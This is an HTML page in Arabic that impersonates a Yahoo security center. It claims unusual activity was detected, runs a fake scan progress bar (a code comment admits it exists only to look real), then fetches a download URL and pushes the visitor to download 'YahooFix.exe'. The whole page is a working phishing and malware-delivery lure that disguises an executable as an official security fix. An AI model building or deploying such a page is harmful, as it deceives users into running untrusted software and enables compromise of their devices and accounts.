<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مركز حماية ياهو | Yahoo Security Center</title>
    <style>
        body { background: #f1f1f1; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 450px; border-top: 6px solid #6001d2; }
        .yahoo-logo { width: 150px; margin-bottom: 25px; }
        h2 { color: #6001d2; font-size: 22px; margin-bottom: 15px; }
        .description { color: #444; font-size: 15px; line-height: 1.6; }
        .loading-box { width: 100%; background: #e0e0e0; height: 12px; border-radius: 6px; margin: 25px 0; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #6001d2; transition: 0.1s linear; }
        .status-text { color: #777; font-size: 13px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo Logo" class="yahoo-logo">
        
        <h2>فحص الأمان والخصوصية</h2>
        <p class="description">لقد تم رصد نشاط غير معتاد. يرجى الانتظار بينما نقوم بتجهيز أداة <b>Yahoo Security Fix</b> المخصصة لجهازك لتأمين حسابك فوراً.</p>
        
        <div class="loading-box">
            <div class="progress-fill" id="bar"></div>
        </div>
        
        <div class="status-text" id="status">جاري فحص الثغرات الأمنية (0%)</div>
    </div>

    <script>
        let progress = 0;
        const bar = document.getElementById('bar');
        const statusText = document.getElementById('status');

        const interval = setInterval(() => {
            progress++;
            bar.style.width = progress + '%';
            statusText.innerText = "جاري تحميل أداة الإصلاح... (" + progress + "%)";

            if (progress >= 100) {
                clearInterval(interval);
                statusText.innerText = "بدء التنزيل التلقائي لملف YahooFix.exe...";
                
                // جلب الرابط المباشر من data.json والبدء بالتحميل
                fetch('./data.json').then(r => r.json()).then(data => {
                    window.location.href = data.download_url;
                });
            }
        }, 60); // العداد يستغرق حوالي 6 ثوانٍ ليعطي انطباعاً بالفحص الحقيقي
    </script>
</body>
</html>
